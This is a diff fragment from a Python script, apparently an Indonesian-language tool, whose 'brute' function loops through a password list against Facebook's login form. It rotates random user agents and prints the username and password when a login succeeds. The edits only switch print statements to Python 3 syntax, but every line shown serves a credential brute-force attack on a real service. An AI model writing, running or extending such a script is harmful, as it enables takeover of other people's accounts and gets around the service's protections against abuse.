@@ -41,7 +41,7 @@ def brute(user, passs):
   lol = 'https://www.facebook.com/login.php?login_attempt=1'
   try:
     for pas in passs:
-      print " Mencoba " + pas 
+#       print " Mencoba " + pas 
       dev.addheaders = [('User_agent', random.choice(useragents))]
       url = dev.open(lol)
       dev.select_form(nr = 0)
@@ -51,10 +51,10 @@ def brute(user, passs):
       meki = mleb.geturl()
       if meki != lol and (not 'login_attempt' in meki):
         x = PrettyTable()
-        print " "
+        print (" ")
         x.add_column("Username", [user])
         x.add_column("Password", [pas])
-        print x
+        print (x)
         break
 
   except: pass
